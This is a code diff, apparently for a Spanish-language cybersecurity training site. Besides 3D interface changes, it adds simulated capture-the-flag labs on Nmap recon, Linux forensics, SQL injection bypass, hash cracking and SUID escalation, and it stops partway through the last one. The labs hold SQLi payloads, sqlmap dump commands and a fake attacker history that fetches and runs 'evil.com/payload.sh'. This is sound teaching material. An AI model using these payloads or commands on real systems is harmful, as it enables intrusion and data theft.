-autoBtn.addEventListener('click',()=>{autoRotate=!autoRotate;document.getElementById('autoIcon').className=autoRotate?'fa-solid fa-pause':'fa-solid fa-play';autoBtn.style.color=autoRotate?'#00ff88':'';autoBtn.style.borderColor=autoRotate?'#00ff88':'';});
+autoBtn.addEventListener('click',()=>{autoRotate=!autoRotate;document.getElementById('autoIcon').className=autoRotate?'fa-solid fa-pause':'fa-solid fa-play';autoBtn.classList.toggle('active',autoRotate);});
+document.getElementById('btnDragon').addEventListener('click',()=>{
+  dragonEnabled=!dragonEnabled;
+  dragonSVGEl.style.display = dragonEnabled ? '' : 'none';
+  if(!dragonEnabled) hideSpeech();
+  document.getElementById('btnDragon').classList.toggle('active',dragonEnabled);
+  diStatus.textContent=dragonEnabled?'Patrullando la red...':'En modo stealth...';
+});
 
 const levelOverlay=document.getElementById('levelOverlay');
 document.getElementById('btnInfo').addEventListener('click',()=>levelOverlay.classList.add('active'));
 document.getElementById('closeLevelModal').addEventListener('click',()=>levelOverlay.classList.remove('active'));
 levelOverlay.addEventListener('click',e=>{if(e.target===levelOverlay)levelOverlay.classList.remove('active');});
-
 const previewOverlay=document.getElementById('previewOverlay');
 document.getElementById('closePreview').addEventListener('click',()=>previewOverlay.classList.remove('active'));
 previewOverlay.addEventListener('click',e=>{if(e.target===previewOverlay)previewOverlay.classList.remove('active');});
 
-const raycaster=new THREE.Raycaster();const mouseVec=new THREE.Vector2();const tooltip=document.getElementById('tooltip');let hovered=null;
-function handleHover(cx,cy){const rect=renderer.domElement.getBoundingClientRect();mouseVec.x=((cx-rect.left)/rect.width)*2-1;mouseVec.y=-((cy-rect.top)/rect.height)*2+1;raycaster.setFromCamera(mouseVec,camera);const hits=raycaster.intersectObjects(hitObjects);if(hits.length>0){const{platform,idx}=hits[0].object.userData;hovered=platform;document.getElementById('ttNum').textContent=`# ${String(idx+1).padStart(2,'0')}`;document.getElementById('ttName').textContent=platform.name;const badge=document.getElementById('ttBadge');badge.textContent=LEVEL_NAMES[platform.level];badge.style.background=LEVEL_COLORS[platform.level]+'22';badge.style.color=LEVEL_COLORS[platform.level];document.getElementById('ttUrl').textContent=platform.domain;document.getElementById('ttDesc').textContent=platform.desc;document.getElementById('ttFeatures').innerHTML=platform.features.map(f=>`<span>${f}</span>`).join('');const tw=280,th=180;let tx=cx+15,ty=cy-10;if(cx+tw>W-20)tx=cx-tw-15;if(ty+th>H-20)ty=H-th-20;if(ty<10)ty=10;tooltip.style.left=tx+'px';tooltip.style.top=ty+'px';tooltip.classList.add('visible');renderer.domElement.style.cursor=dragging?'grabbing':'pointer';}else{hovered=null;tooltip.classList.remove('visible');renderer.domElement.style.cursor=dragging?'grabbing':'';}}
-
+/* Hover / click */
+const raycaster=new THREE.Raycaster();const mouseVec=new THREE.Vector2();
+const tooltip=document.getElementById('tooltip');let hovered=null;
+function handleHover(cx,cy){
+  const rect=renderer.domElement.getBoundingClientRect();
+  mouseVec.x=((cx-rect.left)/rect.width)*2-1;
+  mouseVec.y=-((cy-rect.top)/rect.height)*2+1;
+  raycaster.setFromCamera(mouseVec,camera);
+  const hits=raycaster.intersectObjects(hitObjects);
+  if(hits.length>0){
+    const{platform,idx}=hits[0].object.userData; hovered=platform;
+    document.getElementById('ttNum').textContent=`PLATAFORMA #${String(idx+1).padStart(2,'0')}`;
+    document.getElementById('ttName').textContent=platform.name;
+    const badge=document.getElementById('ttBadge');badge.textContent=LEVEL_NAMES[platform.level];badge.style.background=LEVEL_COLORS[platform.level]+'22';badge.style.color=LEVEL_COLORS[platform.level];
+    document.getElementById('ttUrl').textContent=platform.domain;
+    document.getElementById('ttDesc').textContent=platform.desc;
+    document.getElementById('ttFeatures').innerHTML=platform.features.map(f=>`<span>${f}</span>`).join('');
+    const tw=280,th=180;let tx=cx+15,ty=cy-10;
+    if(cx+tw>W-20)tx=cx-tw-15;if(ty+th>H-20)ty=H-th-20;if(ty<10)ty=10;
+    tooltip.style.left=tx+'px';tooltip.style.top=ty+'px';tooltip.classList.add('visible');
+    renderer.domElement.style.cursor=dragging?'grabbing':'pointer';
+  } else {
+    hovered=null;tooltip.classList.remove('visible');renderer.domElement.style.cursor=dragging?'grabbing':'';
+  }
+}
 renderer.domElement.addEventListener('click',e=>{if(hovered){e.preventDefault();showPlatformPreview(hovered);}});
-
-function showPlatformPreview(p){document.getElementById('pvName').textContent=p.name;const badge=document.getElementById('pvBadge');badge.textContent=LEVEL_NAMES[p.level];badge.style.background=LEVEL_COLORS[p.level]+'22';badge.style.color=LEVEL_COLORS[p.level];document.getElementById('pvDesc').textContent=p.desc;document.getElementById('pvReason').textContent=p.reason;document.getElementById('pvFeatures').innerHTML=p.features.map(f=>`<li>${f}</li>`).join('');document.getElementById('pvDomain').textContent=p.domain;document.getElementById('pvType').textContent=p.type;document.getElementById('pvLang').textContent=p.lang;document.getElementById('pvPrice').textContent=p.price;document.getElementById('pvVisit').href=p.url;document.getElementById('pvSEO').href=`https://www.google.com/search?q=site:${p.domain}+seo+security+info`;previewOverlay.classList.add('active');}
+function showPlatformPreview(p){
+  document.getElementById('pvName').textContent=p.name;
+  const badge=document.getElementById('pvBadge');badge.textContent=LEVEL_NAMES[p.level];badge.style.background=LEVEL_COLORS[p.level]+'22';badge.style.color=LEVEL_COLORS[p.level];
+  document.getElementById('pvDesc').textContent=p.desc;document.getElementById('pvReason').textContent=p.reason;
+  document.getElementById('pvFeatures').innerHTML=p.features.map(f=>`<li>${f}</li>`).join('');
+  document.getElementById('pvDomain').textContent=p.domain;document.getElementById('pvType').textContent=p.type;
+  document.getElementById('pvLang').textContent=p.lang;document.getElementById('pvPrice').textContent=p.price;
+  document.getElementById('pvVisit').href=p.url;
+  previewOverlay.classList.add('active');
+}
 
 window.addEventListener('resize',()=>{W=window.innerWidth;H=window.innerHeight;aspect=W/H;renderer.setSize(W,H);applyCam();});
 
+/* =====================================================================
+   LOOP DE ANIMACIÓN
+   ===================================================================== */
 const clock=new THREE.Clock();
-function animate(){requestAnimationFrame(animate);const dt=clock.getDelta();time+=dt;if(autoRotate){sph.theta+=dt*0.15;applyCam();}allPlatformGroups.forEach(g=>{const{phase}=g.userData;g.position.y=Math.sin(time*0.7+phase)*0.15;if(g.userData.ring)g.userData.ring.material.opacity=0.3+Math.sin(time*1.8+phase)*0.2;});for(let i=0;i<PCOUNT;i++){pOffsets[i]=(pOffsets[i]+dt*0.05)%1;const pt=pathCurve.getPointAt(pOffsets[i]);pPositions[i*3]=pt.x;pPositions[i*3+1]=pt.y+0.35;pPositions[i*3+2]=pt.z;}pGeo.attributes.position.needsUpdate=true;pMat.opacity=0.6+Math.sin(time*3)*0.3;renderer.render(scene,camera);}
 
-applyCam();animate();
+function animate(){
+  requestAnimationFrame(animate);
+  const dt=Math.min(clock.getDelta(),0.05);
+  time+=dt;
+
+  if(autoRotate){sph.theta+=dt*0.15;applyCam();}
+
+  // Plataformas flotando
+  allPlatformGroups.forEach(g=>{
+    const{phase}=g.userData;
+    g.position.y=Math.sin(time*0.7+phase)*0.15;
+    if(g.userData.ring)g.userData.ring.material.opacity=0.3+Math.sin(time*1.8+phase)*0.2;
+  });
+
+  // Partículas del camino
+  for(let i=0;i<PCOUNT;i++){
+    pOffsets[i]=(pOffsets[i]+dt*0.05)%1;
+    const pt=pathCurve.getPointAt(pOffsets[i]);
+    pPositions[i*3]=pt.x;pPositions[i*3+1]=pt.y+0.35;pPositions[i*3+2]=pt.z;
+  }
+  pGeo.attributes.position.needsUpdate=true;
+  pMat.opacity=0.6+Math.sin(time*3)*0.3;
+
+  // ── SVG Dragon ──
+  updateSVGDragon(dt);
+
+  renderer.render(scene,camera);
+}
+
+applyCam(); animate();
 document.body.addEventListener('touchmove',e=>{if(!e.target.closest('.modal-card'))e.preventDefault();},{passive:false});
+
+/* =====================================================================
+   LABORATORIO DE RETOS — Simulador estilo TryHackMe
+   ===================================================================== */
+const LABS = [
+  {
+    id:'recon01', title:'Reconocimiento con Nmap', difficulty:'PRINCIPIANTE',
+    diffColor:'#00ff88',
+    theory:{
+      concept:'El reconocimiento (o "recon") es la primera fase de cualquier test de penetración. Consiste en recopilar información sobre el objetivo: qué puertos están abiertos, qué servicios corren y qué versiones usan. Nmap es la herramienta estándar de la industria para esto.',
+      points:[
+        'Un <strong style="color:#e0e0e8">puerto</strong> es como una puerta numerada en un servidor. Cada servicio escucha en uno (ej: HTTP → 80, SSH → 22).',
+        'Un <strong style="color:#e0e0e8">escaneo de puertos</strong> prueba cuáles de esas puertas están abiertas y responden.',
+        'Con <strong style="color:#e0e0e8">-sV</strong> (version scan) Nmap intenta identificar el software y versión exacta del servicio.',
+        'Con <strong style="color:#e0e0e8">-sC</strong> ejecuta scripts básicos de detección que pueden revelar configuraciones inseguras.',
+        'La información recopilada permite planificar el siguiente paso del ataque o auditoría.',
+      ],
+      tools:[
+        { cmd:'nmap <ip>', desc:'Escaneo básico — los 1000 puertos más comunes' },
+        { cmd:'nmap -sV <ip>', desc:'Detecta versiones de cada servicio' },
+        { cmd:'nmap -sV -sC <ip>', desc:'Versiones + scripts de detección automática' },
+        { cmd:'curl http://<ip>:<puerto>', desc:'Hace una petición HTTP manual para explorar el servicio web' },
+      ],
+      why:'El 90% de las intrusiones comienza con reconocimiento. Un servicio expuesto sin autenticación (como el panel admin de este reto) puede dar acceso total al sistema. Los pentesters y atacantes siempre empiezan aquí.',
+    },
+    desc:'Tienes acceso a una red interna. Tu objetivo es descubrir qué servicios están corriendo en el host objetivo 10.10.10.5 y encontrar la flag oculta.',
+    objectives:['Escanear puertos abiertos','Identificar versiones de servicios','Encontrar la flag en el puerto correcto'],
+    hints:['Usa nmap -sV para detectar versiones','El puerto 8080 puede tener algo interesante','Prueba curl al puerto que encuentres abierto'],
+    prompt:'kali@cyberpath:~$',
+    startMsg:`<span style="color:#a78bfa">╔══ MISIÓN: Reconocimiento de Red ══╗</span>
+<span style="color:#606070">IP Objetivo : </span><span style="color:#00ff88">10.10.10.5</span>
+<span style="color:#606070">Tu IP       : </span><span style="color:#00ff88">10.10.14.3</span>
+<span style="color:#606070">Objetivo    : </span><span style="color:#e0e0e8">Encontrar la flag oculta</span>
+<span style="color:#505060">─────────────────────────────────────</span>
+<span style="color:#808090">Tip: empieza con un escaneo nmap básico</span>`,
+    state:{},
+    commands:{
+      'nmap 10.10.10.5': `Starting Nmap 7.94 ( https://nmap.org )
+<span style="color:#505060">Scanning 10.10.10.5 [1000 ports]</span>
+PORT     STATE SERVICE
+<span style="color:#00ff88">22/tcp   open  ssh</span>
+<span style="color:#00ff88">80/tcp   open  http</span>
+<span style="color:#00ff88">8080/tcp open  http-proxy</span>
+Nmap done: 1 IP address (1 host up)`,
+      'nmap -sV 10.10.10.5': `Starting Nmap 7.94 ( https://nmap.org )
+PORT     STATE SERVICE  VERSION
+<span style="color:#00ff88">22/tcp   open  ssh      OpenSSH 8.2p1</span>
+<span style="color:#00ff88">80/tcp   open  http     Apache 2.4.41</span>
+<span style="color:#00ff88">8080/tcp open  http     Node.js Express</span>
+<span style="color:#ff9500">→ Puerto 8080 parece un panel admin</span>`,
+      'nmap -sV -sC 10.10.10.5': `PORT     STATE SERVICE  VERSION
+<span style="color:#00ff88">22/tcp   open  ssh      OpenSSH 8.2p1</span>
+<span style="color:#00ff88">80/tcp   open  http     Apache 2.4.41</span>
+| http-title: CyberCorp — Login
+<span style="color:#00ff88">8080/tcp open  http     Node.js Express</span>
+| http-title: Admin Panel — NO AUTH REQUIRED
+<span style="color:#ff5555">⚠ Panel admin expuesto sin autenticación</span>`,
+      'curl http://10.10.10.5': `<!DOCTYPE html><html>
+<title>CyberCorp Login</title>
+<!-- TODO: remove debug endpoint /debug -->
+<form action="/login">...</form>`,
+      'curl http://10.10.10.5:8080': `{"status":"ok","app":"CyberCorp Admin v1.2","endpoints":["/status","/users","/flag"]}
+<span style="color:#ff9500">→ Hay un endpoint /flag interesante...</span>`,
+      'curl http://10.10.10.5:8080/flag': `<span style="color:#00ff88">✔ ¡FLAG ENCONTRADA!</span>
+<span style="color:#a78bfa">╔═══════════════════════════════╗</span>
+<span style="color:#a78bfa">║</span>  <span style="color:#ff9500">FLAG{nmap_reveals_all_5ec3t}</span>  <span style="color:#a78bfa">║</span>
+<span style="color:#a78bfa">╚═══════════════════════════════╝</span>
+<span style="color:#808090">+150 XP — Misión completada 🎯</span>`,
+      'curl http://10.10.10.5:8080/users': `[{"id":1,"user":"admin","role":"superadmin"},
+ {"id":2,"user":"jdoe","role":"analyst"},
+ {"id":3,"user":"flag_holder","role":"guest"}]`,
+      'help': `Comandos disponibles en este reto:
+  nmap [opciones] &lt;ip&gt;   — escanear puertos
+  curl &lt;url&gt;             — hacer petición HTTP
+  hint                   — pedir una pista`,
+    }
+  },
+  {
+    id:'linux01', title:'Linux Fundamentals: Find the Flag', difficulty:'PRINCIPIANTE',
+    diffColor:'#00ff88',
+    theory:{
+      concept:'Linux es el sistema operativo rey en servidores, dispositivos IoT y sistemas embebidos. Para cualquier profesional de ciberseguridad, manejar la terminal de Linux es una habilidad fundamental — tanto para atacar como para defender sistemas.',
+      points:[
+        '<strong style="color:#e0e0e8">ls</strong> lista archivos. Con <strong style="color:#e0e0e8">-la</strong> muestra también archivos ocultos (los que empiezan con ".").',
+        '<strong style="color:#e0e0e8">cat</strong> muestra el contenido de un archivo en pantalla.',
+        '<strong style="color:#e0e0e8">find</strong> busca archivos por nombre, permisos o tipo en todo el sistema.',
+        'Los archivos ocultos (empiezan con ".") y el historial <strong style="color:#e0e0e8">.bash_history</strong> suelen revelar acciones del atacante.',
+        '<strong style="color:#e0e0e8">base64 -d</strong> decodifica texto codificado en Base64, formato común para ofuscar datos.',
+      ],
+      tools:[
+        { cmd:'ls -la', desc:'Lista archivos incluyendo ocultos y permisos' },
+        { cmd:'cat <archivo>', desc:'Imprime el contenido del archivo' },
+        { cmd:'find / -name "*.txt" 2>/dev/null', desc:'Busca todos los .txt ignorando errores de permisos' },
+        { cmd:'base64 -d <archivo>', desc:'Decodifica contenido en Base64' },
+      ],
+      why:'Cuando un atacante compromete un servidor, suele dejar rastros: archivos ocultos, historiales de comandos, notas. Saber navegar el sistema de archivos Linux permite tanto encontrar evidencias forenses como obtener flags en CTFs y máquinas virtuales de entrenamiento.',
+    },
+    desc:'Estás dentro de un servidor Linux comprometido. El atacante dejó una flag en algún lugar del sistema de archivos. Encuéntrala usando comandos básicos de Linux.',
+    objectives:['Explorar el sistema de archivos','Buscar archivos ocultos o sospechosos','Leer la flag'],
+    hints:['Usa ls -la para ver archivos ocultos','find puede buscar por nombre','Los archivos .txt suelen tener flags','Revisa /home y /tmp'],
+    prompt:'root@victim-server:~#',
+    startMsg:`<span style="color:#ff5555">╔══ ACCESO ROOT OBTENIDO ══╗</span>
+<span style="color:#606070">Host    : </span><span style="color:#e0e0e8">victim-server</span>
+<span style="color:#606070">Usuario : </span><span style="color:#ff5555">root</span>
+<span style="color:#606070">OS      : </span><span style="color:#e0e0e8">Ubuntu 20.04 LTS</span>
+<span style="color:#505060">─────────────────────────────</span>
+<span style="color:#808090">El atacante dejó algo aquí. Búscalo.</span>`,
+    state:{},
+    commands:{
+      'ls': `Desktop  Documents  Downloads  flag.txt.enc  .bash_history  .secret`,
+      'ls -la': `total 48
+drwxr-xr-x  6 root root 4096 Apr  1 03:14 .
+drwxr-xr-x 20 root root 4096 Apr  1 03:00 ..
+-rw-------  1 root root  420 Apr  1 03:22 <span style="color:#ff9500">.bash_history</span>
+drwxr-xr-x  2 root root 4096 Apr  1 03:00 Desktop
+drwxr-xr-x  2 root root 4096 Apr  1 03:00 Documents
+drwxr-xr-x  2 root root 4096 Apr  1 03:00 Downloads
+-rw-r--r--  1 root root   44 Apr  1 03:14 <span style="color:#ff5555">flag.txt.enc</span>
+drwx------  2 root root 4096 Apr  1 03:10 <span style="color:#ff9500">.secret</span>`,
+      'cat .bash_history': `cd /tmp
+wget http://evil.com/payload.sh
+chmod +x payload.sh
+./payload.sh
+echo "flag backup" > /tmp/.hidden_flag
+base64 flag.txt > flag.txt.enc
+rm flag.txt`,
+      'cat flag.txt.enc': `<span style="color:#ff9500">RkxBR3tsaW51eF9iYXNpY3NfMHduM2R9Cg==</span>
+<span style="color:#808090">(parece base64...)</span>`,
+      'base64 -d flag.txt.enc': `<span style="color:#00ff88">✔ ¡FLAG ENCONTRADA!</span>
+<span style="color:#a78bfa">╔═══════════════════════════════════╗</span>
+<span style="color:#a78bfa">║</span>  <span style="color:#ff9500">FLAG{linux_basics_0wn3d}</span>         <span style="color:#a78bfa">║</span>
+<span style="color:#a78bfa">╚═══════════════════════════════════╝</span>
+<span style="color:#808090">+120 XP — ¡Buen trabajo!</span>`,
+      'ls /tmp': `<span style="color:#ff9500">.hidden_flag</span>  payload.sh  systemd-private-xxx`,
+      'cat /tmp/.hidden_flag': `<span style="color:#808090"># backup — por si acaso</span>
+<span style="color:#00ff88">✔ ¡FLAG ALTERNATIVA!</span>
+<span style="color:#ff9500">FLAG{linux_basics_0wn3d}</span>
+<span style="color:#808090">+120 XP</span>`,
+      'ls .secret': `<span style="color:#808090">credentials.txt  notes.md</span>`,
+      'cat .secret/credentials.txt': `admin:Password123!
+root:toor
+backup_user:Backup2024`,
+      'cat .secret/notes.md': `TODO:
+- Limpiar logs (/var/log/auth.log)
+- Borrar payload de /tmp
+- Mover flag a sitio más seguro`,
+      'find / -name "*.txt" 2>/dev/null': `/root/flag.txt.enc
+/root/.secret/credentials.txt
+/root/.secret/notes.md
+/tmp/.hidden_flag
+/var/www/html/robots.txt`,
+      'find / -name "flag*" 2>/dev/null': `/root/flag.txt.enc
+/tmp/.hidden_flag`,
+      'ls /var/www/html': `index.html  robots.txt  uploads/`,
+      'cat /var/www/html/robots.txt': `User-agent: *
+Disallow: /uploads/
+Disallow: /admin/
+# FLAG_HINT: base64 decode something you found`,
+      'help': `Comandos disponibles:
+  ls [ruta]              — listar archivos
+  ls -la [ruta]          — listar con ocultos
+  cat &lt;archivo&gt;          — leer archivo
+  find / -name &lt;patron&gt;  — buscar archivos
+  base64 -d &lt;archivo&gt;    — decodificar base64
+  hint                   — pedir una pista`,
+    }
+  },
+  {
+    id:'sqli01', title:'SQL Injection: Bypass Login', difficulty:'INTERMEDIO',
+    diffColor:'#ff9500',
+    theory:{
+      concept:'SQL Injection (SQLi) es una de las vulnerabilidades web más antiguas y todavía más prevalentes. Ocurre cuando una aplicación inserta directamente la entrada del usuario en una consulta SQL sin validarla, permitiendo al atacante manipular la lógica de la base de datos.',
+      points:[
+        'Una consulta típica de login: <code style="color:#a78bfa">SELECT * FROM users WHERE user=\'INPUT\' AND pass=\'INPUT\'</code>',
+        'Si introduces <strong style="color:#e0e0e8">admin\' --</strong>, el <strong style="color:#e0e0e8">--</strong> comenta el resto del query, ignorando el password.',
+        '<strong style="color:#e0e0e8">OR \'1\'=\'1\'</strong> siempre es verdadero, lo que hace que el WHERE sea siempre cierto.',
+        'SQLMap automatiza la detección y explotación de SQLi: enumera bases de datos, tablas y extrae datos.',
+        'El OWASP Top 10 incluye SQL Injection como una de las vulnerabilidades más críticas desde 2010.',
+      ],
+      tools:[
+        { cmd:"curl -X POST <url> -d \"user=admin'--&pass=x\"", desc:'Intento manual de bypass con comentario SQL' },
+        { cmd:"curl -X POST <url> -d \"user=' OR '1'='1'--&pass=x\"", desc:'Bypass completo — siempre verdadero' },
+        { cmd:'sqlmap -u <url> --data="user=x&pass=x" --dbs', desc:'SQLMap: detecta SQLi y enumera bases de datos' },
+        { cmd:'sqlmap ... -D <db> -T <tabla> --dump', desc:'Extrae toda la tabla especificada' },
+      ],
+      why:'SQLi puede dar acceso completo a la base de datos de una aplicación: contraseñas, datos de usuarios, información financiera. Es la causa de miles de brechas de seguridad documentadas. Todo desarrollador y pentester debe entender cómo funciona y cómo prevenirla (prepared statements / consultas parametrizadas).',
+    },
+    desc:'Una aplicación web tiene un panel de login vulnerable. Usa SQL Injection para bypassear la autenticación y obtener acceso de administrador.',
+    objectives:['Identificar el punto de inyección','Bypassear el login con SQLi','Extraer la flag de la base de datos'],
+    hints:["Prueba ' OR '1'='1 en el usuario",'El campo password también es vulnerable','Usa -- para comentar el resto del query','UNION SELECT puede extraer datos de otras tablas'],
+    prompt:'attacker@kali:~$',
+    startMsg:`<span style="color:#ff9500">╔══ MISIÓN: SQL Injection ══╗</span>
+<span style="color:#606070">Target  : </span><span style="color:#e0e0e8">http://vuln-app.local/login</span>
+<span style="color:#606070">Stack   : </span><span style="color:#e0e0e8">PHP + MySQL</span>
+<span style="color:#505060">──────────────────────────────────────</span>
+<span style="color:#808090">Query original: SELECT * FROM users WHERE</span>
+<span style="color:#808090">  username='INPUT' AND password='INPUT'</span>`,
+    state:{},
+    commands:{
+      "curl -X POST http://vuln-app.local/login -d \"user=admin&pass=admin\"": `<span style="color:#ff5555">{"error":"Invalid credentials"}</span>`,
+      "curl -X POST http://vuln-app.local/login -d \"user=admin&pass=admin123\"": `<span style="color:#ff5555">{"error":"Invalid credentials"}</span>`,
+      "curl -X POST http://vuln-app.local/login -d \"user=admin'&pass=x\"": `<span style="color:#ff9500">{"error":"You have an error in your SQL syntax..."}</span>
+<span style="color:#00ff88">→ ¡Error SQL! El campo es vulnerable a SQLi</span>`,
+      "curl -X POST http://vuln-app.local/login -d \"user=admin' --&pass=x\"": `<span style="color:#00ff88">{"success":true,"user":"admin","role":"superadmin"}</span>
+<span style="color:#ff9500">→ Login bypasseado. Query ejecutado:</span>
+<span style="color:#505060">SELECT * FROM users WHERE username='admin' --' AND password='x'</span>`,
+      "curl -X POST http://vuln-app.local/login -d \"user=' OR '1'='1' --&pass=x\"": `<span style="color:#00ff88">{"success":true,"user":"admin","role":"superadmin","token":"eyJ..."}</span>
+<span style="color:#ff9500">→ Autenticación bypasseada completamente</span>`,
+      "curl http://vuln-app.local/dashboard -H \"Authorization: eyJ...\"": `{"welcome":"admin","menu":["users","flags","settings"]}`,
+      "curl http://vuln-app.local/flags -H \"Authorization: eyJ...\"": `<span style="color:#00ff88">✔ ¡FLAG ENCONTRADA!</span>
+<span style="color:#a78bfa">╔════════════════════════════════════════╗</span>
+<span style="color:#a78bfa">║</span>  <span style="color:#ff9500">FLAG{sql1_byp4ss_auth_m4st3r}</span>         <span style="color:#a78bfa">║</span>
+<span style="color:#a78bfa">╚════════════════════════════════════════╝</span>
+<span style="color:#808090">+200 XP — Nivel Intermedio superado 🔥</span>`,
+      "sqlmap -u http://vuln-app.local/login --data='user=admin&pass=x' --dbs": `[*] starting sqlmap
+[INFO] testing connection to target
+[INFO] testing if POST parameter 'user' is dynamic
+<span style="color:#00ff88">[INFO] POST parameter 'user' is vulnerable!</span>
+available databases:
+[*] <span style="color:#00ff88">webapp_db</span>
+[*] information_schema
+[*] mysql`,
+      "sqlmap -u http://vuln-app.local/login --data='user=admin&pass=x' -D webapp_db --tables": `Database: webapp_db
+[3 tables]
++----------+
+| <span style="color:#00ff88">users</span>    |
+| <span style="color:#00ff88">flags</span>    |
+| sessions |
++----------+`,
+      "sqlmap -u http://vuln-app.local/login --data='user=admin&pass=x' -D webapp_db -T flags --dump": `Database: webapp_db
+Table: flags
++----+----------------------------------+
+| id | flag                             |
++----+----------------------------------+
+| 1  | <span style="color:#ff9500">FLAG{sql1_byp4ss_auth_m4st3r}</span>  |
++----+----------------------------------+
+<span style="color:#00ff88">✔ ¡FLAG OBTENIDA CON SQLMAP! +200 XP</span>`,
+      'help': `Comandos disponibles:
+  curl -X POST &lt;url&gt; -d "param=val"  — petición POST
+  curl &lt;url&gt; -H "Header: val"        — petición con header
+  sqlmap -u &lt;url&gt; --data=&lt;params&gt;   — auto SQLi
+  hint                                — pedir pista`,
+    }
+  },
+  {
+    id:'hash01', title:'Hash Cracking: John the Ripper', difficulty:'INTERMEDIO',
+    diffColor:'#ff9500',
+    theory:{
+      concept:'Los sistemas Linux no almacenan contraseñas en texto plano, sino como hashes criptográficos en /etc/shadow. Un hash es una función unidireccional: dado un texto siempre produce el mismo resultado, pero no se puede revertir directamente. El cracking consiste en probar millones de contraseñas hasta encontrar una que genere el mismo hash.',
+      points:[
+        '<strong style="color:#e0e0e8">/etc/shadow</strong> contiene los hashes de contraseñas de todos los usuarios del sistema.',
+        'SHA-512 Crypt ($6$...) es el algoritmo estándar en sistemas Linux modernos.',
+        '<strong style="color:#e0e0e8">Ataque de diccionario</strong>: probar palabras de una lista conocida (wordlist). <strong style="color:#e0e0e8">rockyou.txt</strong> tiene 14 millones de contraseñas reales filtradas.',
+        '<strong style="color:#e0e0e8">John the Ripper</strong> es una herramienta clásica que soporta cientos de formatos de hash.',
+        'Una contraseña débil como "admin123" puede crackearse en segundos; una fuerte (16+ chars, aleatoria) puede tardar años.',
+      ],
+      tools:[
+        { cmd:'hash-identifier', desc:'Identifica el algoritmo de un hash desconocido' },
+        { cmd:'john shadow --wordlist=/usr/share/wordlists/rockyou.txt', desc:'Ataque de diccionario con rockyou' },
+        { cmd:'john shadow --show', desc:'Muestra los hashes ya crackeados' },
+        { cmd:'ssh usuario@ip', desc:'Conectarse al servidor con las credenciales obtenidas' },
+      ],
+      why:'Obtener el archivo /etc/shadow es el primer paso en el post-explotación de un sistema Linux. Si las contraseñas son débiles, el cracking permite moverse lateralmente por la red o escalar privilegios. Comprender esto motiva el uso de contraseñas fuertes y autenticación multifactor.',
+    },
+    desc:'Obtuviste el archivo /etc/shadow de un servidor. Crackea los hashes de contraseña usando John the Ripper y accede al sistema.',
+    objectives:['Identificar el tipo de hash','Crackear el hash con wordlist','Usar las credenciales para acceder por SSH'],
+    hints:['Usa hash-identifier para identificar el tipo','John puede usar rockyou.txt como wordlist','Una vez crackeado, conéctate por SSH','Busca archivos interesantes una vez dentro'],
+    prompt:'kali@kali:~$',
+    startMsg:`<span style="color:#ff5555">╔══ MISIÓN: Hash Cracking ══╗</span>
+<span style="color:#606070">Archivo obtenido : </span><span style="color:#e0e0e8">/etc/shadow</span>
+<span style="color:#606070">Target SSH       : </span><span style="color:#e0e0e8">10.10.10.8:22</span>
+<span style="color:#505060">──────────────────────────────────</span>
+<span style="color:#808090">Tienes el shadow, ahora crackéalo.</span>`,
+    state:{cracked:false},
+    commands:{
+      'cat shadow': `root:$6$xyz$HASH_ROOT:19000:0:99999:7:::
+<span style="color:#00ff88">admin:$6$salt123$8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918:19000:0:99999:7:::</span>
+jdoe:$6$abc$HASH_JDOE:19000:0:99999:7:::
+backup:!:19000:0:99999:7:::`,
+      'hash-identifier': `<span style="color:#a78bfa">Hash Identifier v1.2</span>
+Introduce el hash: $6$salt123$8c6976e5b5410415...
+<span style="color:#00ff88">Possible Hashs:</span>
+[+] SHA-512 Crypt  ← <span style="color:#ff9500">Linux shadow hash</span>`,
+      'john shadow --wordlist=/usr/share/wordlists/rockyou.txt': `Using default input encoding: UTF-8
+Loaded 2 password hashes (sha512crypt [SHA512 128/128])
+<span style="color:#ff9500">Press CTRL+C to abort, or send SIGUSR1 to john</span>
+<span style="color:#00ff88">admin:admin123        (admin)</span>
+1g 0:00:00:08 DONE — 0.1234g/s
+Use the "--show" option to display cracked passwords`,
+      'john shadow --show': `admin:<span style="color:#ff9500">admin123</span>:1001:1001::/home/admin:/bin/bash
+<span style="color:#00ff88">1 password hash cracked</span>`,
+      'ssh admin@10.10.10.8': `The authenticity of host '10.10.10.8' can't be established.
+Are you sure you want to continue connecting? (yes/no): `,
+      'ssh admin@10.10.10.8 -p 22': `admin@10.10.10.8's password: <span style="color:#505060">[admin123]</span>
+<span style="color:#00ff88">Welcome to Ubuntu 20.04 LTS</span>
+Last login: Mon Apr  1 03:14:07 2026
+<span style="color:#ff9500">admin@victim:~$</span> <span style="color:#808090">← ahora estás dentro, busca la flag</span>`,
+      'ls /home/admin': `Desktop  Documents  user.txt  .bash_history`,
+      'cat /home/admin/user.txt': `<span style="color:#00ff88">✔ ¡FLAG ENCONTRADA!</span>
+<span style="color:#a78bfa">╔══════════════════════════════════════╗</span>
+<span style="color:#a78bfa">║</span>  <span style="color:#ff9500">FLAG{john_cr4ck3d_th3_h4sh!}</span>       <span style="color:#a78bfa">║</span>
+<span style="color:#a78bfa">╚══════════════════════════════════════╝</span>
+<span style="color:#808090">+250 XP — ¡Hash crackeado y dentro del sistema! 💀</span>`,
+      'help': `Comandos disponibles:
+  cat &lt;archivo&gt;                    — leer archivo
+  hash-identifier                  — identificar tipo de hash
+  john &lt;archivo&gt; --wordlist=&lt;wl&gt;  — crackear hashes
+  john &lt;archivo&gt; --show            — mostrar crackeados
+  ssh &lt;user&gt;@&lt;ip&gt;                  — conectar por SSH
+  ls &lt;ruta&gt;                        — listar archivos
+  hint                             — pedir pista`,
+    }
+  },
+  {
+    id:'privesc01', title:'Privilege Escalation: SUID Abuse', difficulty:'AVANZADO',
+    diffColor:'#ff5555',
+    theory:{
+      concept:'Privilege Escalation (PrivEsc) es el proceso de pasar de un usuario con permisos limitados a uno con más privilegios, idealmente root. Es la segunda fase después de obtener acceso inicial. Los binarios SUID son una vía clásica de escalada en Linux.',
+      points:[
+        '<strong style="color:#e0e0e8">SUID (Set User ID)</strong>: un bit especial en Linux que hace que un programa se ejecute con los permisos de su dueño, no del usuario que lo lanza.',
+        'Si <strong style="color:#e0e0e8">/usr/bin/find</strong> tiene SUID y pertenece a root, cualquier comando ejecutado con <strong style="color:#e0e0e8">-exec</strong> corre como root.',
+        '<strong style="color:#e0e0e8">GTFObins</strong> (gtfobins.github.io) es una base de datos de binarios Unix que se pueden abusar para escalada, bypass y más.',
+        'Otros vectores comunes: sudo mal configurado, cron jobs, servicios vulnerables, kernel exploits.',
